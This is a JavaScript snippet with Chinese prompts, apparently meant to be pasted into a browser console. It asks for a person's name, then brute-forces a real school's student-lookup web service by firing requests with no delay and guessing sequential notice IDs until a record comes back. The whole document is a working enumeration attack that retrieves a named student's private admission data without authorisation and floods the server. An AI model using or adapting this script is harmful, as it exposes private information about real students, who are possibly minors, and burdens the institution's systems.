loop=1000
stu=prompt("请输入你要查询的人名：")
while(!confirm("查询对象为："+stu+"\n\n请确认！"))
  stu=prompt("请输入你要查询的人名：")
api="https://oa.cqyz.cn/Web Services/student.asmx/NewStudents_Get2"
obj={name:stu,noticeId:""}
function post(){
  loop++
  obj.noticeId="HB"+String(loop)
  console.log("正在对比"+obj.noticeId)
	Ajax.jQuery({
	url: api,
	params: obj,
	fn: function(res){
	  if(res.type!=null){
		clearInterval(ticker)
		console.log("查询完成！用时："+String(new Date()-start)+"ms")
		console.log(res)
	  }
  }})
}
start=new Date()
ticker=setInterval(post)